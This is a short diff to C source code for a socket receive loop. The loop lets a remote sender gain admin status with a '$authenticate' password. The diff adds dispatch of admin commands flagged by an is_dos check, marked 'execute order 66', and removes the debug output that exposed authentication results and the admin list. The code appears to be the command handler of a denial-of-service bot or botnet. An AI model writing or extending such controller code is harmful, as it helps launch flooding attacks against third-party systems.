@@ -209,6 +209,7 @@ void start_recv (SOCKET s, pAccount account) {
             printf ("%s", output);
             // extract elements from messages
             extract (message, output);
+            // trim strings and lower all chars
             format_message (message);
 
             if (strncmp (message->command, "$", 1) == 0) {
@@ -216,23 +217,21 @@ void start_recv (SOCKET s, pAccount account) {
                 if (strncmp (message->command, "$authenticate", 13) == 0) {
                     // check password
                     if (check_pass (message->param)) {
-                        printf ("Pass is correct\n");
                         if (add_admin (account, message)) {
-                            int i;
-                            for (i = 0; i < account->num_admins; i++) {
-                                printf ("Admin[%d]: %s\n", i, account->admins[i]);
-                            }
+                            //  successfully added
                         } else {
                             // admin list expansion error
                             non_fatal ("Admin array realloc");
                         }
                     } else {
                         // deny access
-                        printf ("Pass is incorrect\n");
                     }
                 // check if user is admin
                 } else if (is_admin (account, message)) {
-                    // execute order 66
+                    if (is_dos (message->command)) {
+                        // execute order 66
+                        parse_args (s, message);
+                    }
                 } else {
                     // deny access
                 }
